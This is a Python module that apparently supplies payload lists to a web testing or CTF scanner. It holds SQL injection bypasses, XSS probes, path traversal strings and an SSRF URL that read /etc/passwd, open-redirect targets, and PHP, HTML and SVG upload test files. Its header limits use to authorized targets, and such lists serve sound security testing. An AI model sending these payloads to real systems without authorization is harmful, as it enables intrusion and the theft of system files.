from __future__ import annotations


DANGEROUS_NOTE = "Use only on local/CTF/authorized targets. Scope guard is enabled by default."

SQL_PAYLOADS = [
    "' OR '1'='1' --", "' OR 1=1 --", "admin'--", "' UNION SELECT NULL--",
    "') OR ('1'='1' --", "\" OR \"1\"=\"1\" --", "' OR 'a'='a", "'/**/OR/**/1=1--",
]
XSS_PAYLOADS = [
    "<script>alert('CTF_XSS')</script>", "<img src=x onerror=alert('CTF_XSS')>",
    "\"><svg/onload=alert('CTF_XSS')>", "<details open ontoggle=alert('CTF_XSS')>",
    "javascript:alert('CTF_XSS')",
]
TRAVERSAL_PAYLOADS = ["../../../../etc/passwd", "..%2f..%2f..%2f..%2fetc%2fpasswd", "....//....//etc/passwd"]
SSRF_PAYLOADS = ["http://127.0.0.1:5000/", "http://localhost:5000/", "http://0.0.0.0:5000/", "file:///etc/passwd"]
REDIRECT_PAYLOADS = ["https://example.com", "//example.com", "https://evil.invalid/ctf"]
UPLOADS = [
    ("ctf.php", b"<?php echo 'CTF_UPLOAD_EXEC'; ?>", "application/x-php"),
    ("ctf.html", b"<script>alert('CTF_UPLOAD_XSS')</script>", "text/html"),
    ("ctf.svg", b"<svg onload=alert('CTF_UPLOAD_SVG')></svg>", "image/svg+xml"),
]
STATE_WORDS = ["success", "updated", "changed", "withdraw", "retras", "salvat", "created", "added", "ok"]
